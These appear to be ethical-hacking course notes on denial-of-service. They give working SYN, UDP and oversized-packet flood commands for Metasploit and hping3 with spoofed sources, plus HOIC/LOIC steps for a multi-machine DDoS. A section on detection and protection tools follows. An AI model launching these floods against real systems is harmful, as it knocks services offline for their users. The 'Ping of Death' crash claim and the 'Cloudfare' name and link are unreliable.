# Module 10 - Denial-of-Service #
Denial-of-Service is an attack on a computer or network that reduces, restricts or prevents accessibility of system resources to its legitimate users.

In general, the following are categories of DoS/DDoS attack vectors:
* Volumetric Attacks - Consume the bandwidth of the target network or service. Attack techniques: UDP Flooding, ICMP Flooding, Ping of Death, Smurf, Pulse Wave...
* Protocol Attacks - Consume resources like connection state tables present in the network infrastructure components such as load-balancers, firewalls and application servers. Attack techniques: SYN Flooding, Fragmentation attack, Spoofed Session Flood attack, ACK Flood attack...
* Application Layer Attacks - Consume application resources or services, making them unavailable to other legitimate users. Attack techniques: HTTP GET/POST attack, Slowloris attack, UDP Application Layer Flooding...


## SYN Flooding a Target ##
SYN Flooding takes advantage of a flaw with regard to how most hosts implement the TCP three-way handshake. This attack occurs when the intruder sends unlimited SYN packets (requests) to the host system, the host will keep track of the partially open connections while waiting in a listening queue for response ACK packets.

### Metasploit ###
``` msfconsole ```

1. ``` use auxiliary/dos/tcp/synflood ```
2. ``` show options ```, ``` set RHOST <Target IP> ```, ``` set RPORT <Open Target Port - Ex. 21> ```, ``` set SHOST <Spoofed Source IP> ```, ``` set TIMEOUT <Seconds to wait for new data - Ex. 20000> ```
3. ``` exploit ```

### Hping3 ###
``` hping3 -S <Target IP> -a <Spoofed Source IP> -p <Target Port> --flood ``` - SYN Flood '-S' sets the TCP SYN flag 

Other volumetric attacks:

``` hping3 -d 65538 -S -p <Target Port> --flood <Target IP> ``` - Ping of Death Attack. 65538 bytes exceed the max of 65535 bytes, causing the target system to crash.
``` hping3 -2 -p <Target Port (UDP)- ex. 139,137,138,389,161...> --flood <Target IP> ``` - UDP Application Layer Flood


## Performing Distributed Denial-of-Service Attacks ##
### High Orbit Ion Cannon (HOIC) ###
HOIC is a network stress and DoS/DDoS attack application. It is designed to attack up to 256 target URLs simultaneously. It sends HTTP POST and GET requests to a computer that uses lulz inspired GUIs. It offers a high-speed multi-threaded HTTP Flood, a built-in scripting system that allows the deployment of 'boosters' that are scrips designed to thwart DDoS countermeasures and increase DoS output.

It can be found at: `Module 10 Denial-of-Service\DoS and DDoS Attack Tools\`.

Do this in all the machines:
1. Set the Target, set the Power bar to 'High', select the Booster 'GenericBoost.hoic', and click 'Add'
2. Set the nº of threads - Ex. 20
3. Do the same on as many machines as you can
4. 'Fire Teh Lazer!'

### Low Orbit Ion Cannon (LOIC) ###
LOIC is a network stress testing and DoS attack application. It can be found at: `Module 10 Denial-of-Service\DoS and DDoS Attack Tools\`.

Do this in all the machines:
1. 'Select your target' > Type the IP > 'Lock On'
2. 'Attack Options' > Method: UDP, Threads: 10. Also slide the 'Speed' bar to the middle.
3. 'IMMA CHARGIN MAH LAZER'


## Other DoS/DDoS Tools ##
* HULK (https://siberianlaika.ru)
* XOIC (http://anonhacktivism.blogspot.com)
* Tor's Hammer (https://sourceforge.net)
* Slowloris (GitHub)
* R-U-Dead-Yet 
* Tsunami 
* Moihack Port-Flooder

- - - -

## Detect and Protect Against DoS and DDoS Attacks ##
DoS and DDoS detection techniques are based on identifying and discriminating the illegitimate traffic increase and flash events from the legitimate packet traffic. The following are three types of detection techniques:
* Activity Profiling: Profiles based on the average packet rate for a network flow
* Sequential Change-Point Detection: Filters network traffic by IP addresses, targeted port numbers and communication protocols used, and stores the traffic flow data in a graph that shows the traffic flow rate over time
* Wavelet-Based Signal Analysis: Analyzes network traffic in terms of spectral components

### Anti DDoS Guardian ###
Anti DDoS Guardian is a DDoS attack protection tool. It protects the following Servers: IIS, Apache, game, Camfrog, mail, FTP, VOIP PBX and SIP, and other systems. It limits the network flow number, client bandwidth, client concurrent TCP connection number and TCP connection rate. It also limits the UDP bandwidth, UDP connection rate, and UDP packet rate.

It can be found at: `Module 10 Denial-of-Service\DoS and DDoS Protection Tools\`.

### Other DoS and DDoS Protection Tools ###
* Imperva Incapsula DDoS Protection (https://www.incapsula.com)
* DOSarrest's DDoS protection service (https://www.dosarrest.com)
* DDoS-Guard (https://ddos-guard.net)
* Cloudfare (https://www.cloudfare.com)

